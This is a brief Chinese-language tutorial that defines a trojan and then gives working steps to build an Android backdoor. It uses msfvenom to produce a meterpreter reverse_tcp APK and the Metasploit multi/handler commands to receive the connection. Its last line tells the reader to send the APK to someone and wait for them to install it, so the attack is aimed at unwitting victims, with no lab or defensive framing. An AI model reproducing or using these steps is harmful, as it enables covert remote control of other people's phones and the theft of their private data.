什么是木马?

木马就是一种恶意的远程控制窃取用户敏感信息的恶意软件,木马具有隐蔽性一般人是很难发现他的存在, 木马是不会发作没有任务栏图标没有窗口所以隐藏性很强

木马是用来控制别人电脑 例如查看别人电脑的文件系统对别人电脑里面的文件进行操作也会用来记录你键盘的点击和操作,木马会悄悄地 躲在你电脑里面窃取隐私信息发给黑客 任意接收黑客发送的命令并且执行

1.开始生成木马

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=6667 R > /root/apk.apk

2.监听木马端口

第一步:

开始监听木马

use exploit/multi/handler //使用这个模块

set playload android/meterpreter/reverse_tcp//设置攻击负荷

set lhost 192.168.0.106 //在这里设置本地的IP地址

set lport 6667 //这里设置端口要和木马设置的端口保持一致

exploit//开始攻击

木马处于监听状态 等到别人点击木马了你这里就会出现控制台

把apk导出给发给别人然后等着别人在手机安装就可以了
